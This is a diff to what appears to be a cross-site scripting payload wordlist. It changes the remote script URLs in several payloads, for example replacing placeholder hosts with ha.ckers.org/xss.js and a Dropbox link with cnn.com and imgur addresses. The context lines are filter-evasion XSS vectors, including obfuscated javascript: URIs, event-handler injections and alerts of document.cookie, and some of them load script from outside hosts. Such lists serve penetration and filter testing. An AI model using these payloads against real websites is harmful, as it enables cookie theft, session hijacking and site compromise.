@@ -114,7 +114,7 @@ http://www.google<script .com>alert(document.location)</script
 <iframe/%00/ src=javaSCRIPT&colon;alert(1)
 //<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
 /*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
-//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
+//|\\ <script //|\\ src='https://www.cnn.com/u/13018058/js.js'> //|\\ </script //|\\
 </font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
 <a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
 </plaintext\></|\><plaintext/onmouseover=prompt(1)
@@ -413,12 +413,12 @@ perl -e 'print "<IMG SRC=java\0script:alert("XSS")>";' > out
 a="get";b="URL";c="javascript:";d="alert('xss');";eval(a濧);   
 ='><script>alert("xss")</script>
 <isindex action="javas&Tab;cript:alert(1)" type=image>
-<script늷=">"늷="http://yoursite.com/xss.js?69,69"></script>   
+<script늷=">"늷="http://ha.ckers.org/xss.js"></script>   
 <body background=javascript:'"><script>alert(navigator.userAgent)</script>></body>   
 ">/XaDoS/><script>alert(document.cookie)</script>
-<script>  src="http://www.site.com/XSS.js"></script>   
+<script>  src="http://ha.ckers.org/xss.js"></script>   
 ">/KinG-InFeT.NeT/><script>alert(document.cookie)</script>   
-src="http://www.site.com/XSS.js"></script> 
+src="http://ha.ckers.org/xss.js"></script> 
 "><BODY onload!#$%&()*~+_.,:;?@[/|]^`=alert("XSS")>   
 [color=red width=expression(alert(123))][color]   
 <BASE HREF="javascript:alert('XSS');//">   
@@ -431,7 +431,7 @@ Execute(MsgBox(chr(88)&chr(83)&chr(83)))<
 </script></script><<<<script><>>>><<<script>alert(123)</script>  
 <INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">   
 '></select><script>alert(123)</script>   
-'>"><script src = 'http://www.site.com/XSS.js'></script>   
+'>"><script src = 'http://ha.ckers.org/xss.js'></script>   
 }</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>
 <html><noalert><noscript>(123)</noscript><script>(123)</script>
 <IMG SRC=JaVaScRiPt:alert('XSS')>
@@ -638,7 +638,7 @@ http://www.google<script .com>alert(document.location)</script
 <iframe// src=javaSCRIPT&colon;alert(1)
 //<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
 /*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt/*iframe/src*/>
-//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
+//|\\ <script //|\\ src='http://i.imgur.com/P8mL8.jpg'> //|\\ </script //|\\
 </font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
 <a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
 </plaintext\></|\><plaintext/onmouseover=prompt(1)
